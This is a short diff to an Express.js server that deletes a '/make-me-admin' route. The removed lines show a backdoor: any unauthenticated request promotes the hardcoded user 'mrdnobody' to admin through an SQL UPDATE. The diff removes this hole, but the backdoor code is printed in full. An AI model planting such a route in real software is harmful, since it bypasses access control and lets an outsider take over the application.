@@ -337,19 +337,7 @@ app.post("/admin/recharge",
     }
   }
 );
-app.get("/make-me-admin", async (req, res) => {
-  try {
-    await pool.query(
-      "UPDATE users SET role = 'admin' WHERE username = $1",
-      ["mrdnobody"]
-    );
-
-    res.send("You are now admin 👑");
-  } catch (err) {
-    console.error(err);
-    res.status(500).send("Error");
-  }
-});
+ 
 
 /* ================= START ================= */
 
